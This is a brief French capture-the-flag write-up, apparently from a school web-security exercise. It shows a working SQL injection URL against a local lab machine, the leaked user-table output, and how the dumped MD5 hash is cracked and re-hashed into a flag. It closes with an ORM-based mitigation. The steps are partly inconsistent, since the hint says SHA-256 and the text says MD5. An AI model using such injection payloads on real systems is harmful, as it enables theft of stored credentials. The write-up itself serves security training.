# Sql_0

## Detection des failles

http://192.168.56.102/?page=member&id=1 OR 1=1 UNION SELECT Commentaire, countersign FROM users--&Submit=Submit#

on s'interessera aux deux lignes:
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

Le champ "Surname" est le md5 a decrypter

Quand on le decrypt, on obtient: FortyTwo

En minuscule : fortytwo

On le crypte maintenant en md5


## Comment s'en premunir

Utiliser un ORM (object-relational mapping) en passant par le server,
afin qu'il envoi les données sous forme de classe